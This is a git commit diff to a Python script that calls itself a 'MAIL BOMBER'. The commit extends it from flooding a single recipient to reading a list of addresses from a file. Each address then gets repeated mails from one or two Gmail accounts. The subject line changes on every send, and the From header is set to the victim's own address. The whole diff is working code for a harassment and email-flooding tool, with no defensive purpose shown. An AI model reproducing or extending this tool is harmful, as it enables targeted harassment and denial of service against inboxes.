c1fd1f8e4e9f5b4f5bf2ccdf96130acab4519126
v01ds <59950214+v01ds@users.noreply.github.com>
2020-12-02 17:31:16 +0300

    Added Input Mail List

--- BombEmAll/BombEmAll.py
+++ BombEmAll/BombEmAll.py
@@ -3,6 +3,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 import sys
 
+
 # Some show...
 print(' ')
 print("MAIL BOMBER BY V01DS!!! USE IT WISELY!!!")
@@ -42,18 +43,26 @@ sender_pass = input("Type your password and press enter: ")
 print(' ')
 
 sender_mail2 = input("Type your second mail and press enter, don't type anything if you don't use a second mail: ")
+    
 print(' ')
 
 sender_pass2 = input("Type your second mails password and press enter: ")
 print(' ')
 
-reciever = input("Who are you sending the mail to?: ")
+mail_path = input("Enter the mail list path: ")
+good_path = open(mail_path, 'r')
 print(' ')
 
-bomb_times = int(input("How many times do you want to send this mail?: "))
+
+bomb_times = int(input("How many times do you want to send your mails for each address in the list?: "))
+if sender_mail2 != '':
+    if int(bomb_times) == 1:
+        bomb_times = bomb_times
+    if int(bomb_times) % 2 == 1:
+        bomb_times = (bomb_times + 1) / 2    
+    else:
+        bomb_times = bomb_times / 2
 print(' ')
-
-
 
 
 # Sending the mails 
@@ -64,7 +73,7 @@ def sendFirst():
             mail = MIMEMultipart("alternative")
             mail["From"] = reciever
             mail["Subject"] = subject
-            mail["To"] = reciever
+            mail['To'] = reciever
         
             part1 = MIMEText(text, "plain")
             part2 = MIMEText(html, "html")
@@ -76,20 +85,20 @@ def sendFirst():
             server.starttls()
             server.login(sender_mail, sender_pass)
             server.sendmail(sender_mail, reciever, mail.as_string())
-            print('Mail sent from the first account')
+            print('Mail sent from the first account to ' + str(reciever))
     
         elif html_ask != 'y':
             mail = MIMEText(message, "html", "utf-8")
             mail["From"] = reciever
             mail["Subject"] = subject
-            mail["To"] = reciever
+            mail['To'] = reciever
             mail = mail.as_string()
             
             server = smtplib.SMTP('smtp.gmail.com:587') 
             server.starttls() 
             server.login(sender_mail, sender_pass)   
             server.sendmail(sender_mail, reciever, mail) 
-            print('Mail sent from the first account')
+            print('Mail sent from the first account to ' + str(reciever))
           
     except KeyboardInterrupt:
         print("An error has occured")
@@ -100,7 +109,7 @@ def sendSecond():
             mail2 = MIMEMultipart("alternative")
             mail2["From"] = reciever
             mail2["Subject"] = subject
-            mail2["To"] = reciever
+            mail2['To'] = reciever
         
             part1 = MIMEText(text, "plain")
             part2 = MIMEText(html, "html")
@@ -112,41 +121,52 @@ def sendSecond():
             server.starttls()
             server.login(sender_mail2, sender_pass2)
             server.sendmail(sender_mail2, reciever, mail2.as_string())
-            print('Mail sent from the second account')
+            print('Mail sent from the second account to ' + str(reciever))
             
         elif html_ask != 'y':
 
             mail2 = MIMEText(message, "html", "utf-8")
             mail2["From"] = reciever
             mail2["Subject"] = subject
-            mail2["To"] = reciever
+            mail2['To'] = reciever
             mail2 = mail2.as_string()
     
             server = smtplib.SMTP('smtp.gmail.com:587') 
             server.starttls() 
             server.login(sender_mail2, sender_pass2)   
             server.sendmail(sender_mail2, reciever, mail2) 
-            print('Mail sent from the second account')
+            print('Mail sent from the second account to ' + str(reciever))
          
     except KeyboardInterrupt:
         print("An error has occured")
 
-if sender_mail2 == '':        
-    while bomb_times > 0:
-        sendFirst()
-        subject = subject + str(1)
-        bomb_times = bomb_times - 1
-    print(' ')
-    print('----------------------------------------------------------')
-    print(' ')
-    print('All the mails are sent!')
-else:
-    while bomb_times > 0:
-        sendFirst()
-        sendSecond()
-        subject = subject + str(1)
-        bomb_times = bomb_times - 2
-    print(' ')
-    print('----------------------------------------------------------')
-    print(' ')
-    print('All the mails are sent!')
+
+while True:
+    
+    if sender_mail2 == '': 
+        email = good_path.readline().replace('\n','')
+        bacot = email.strip().split(':')
+        reciever = str(bacot[0])
+        if not email:
+            break
+        for i in range(bomb_times):
+                sendFirst()
+                subject = subject + str(1)
+
+    
+    else:    
+        email = good_path.readline().replace('\n','')
+        bacot = email.strip().split(':')
+        reciever = str(bacot[0])
+        if not email:
+            break
+        for i in range(int(bomb_times)):
+                sendFirst()
+                sendSecond()
+                subject = subject + str(1)
+            
+            
+            
+        
+        
+
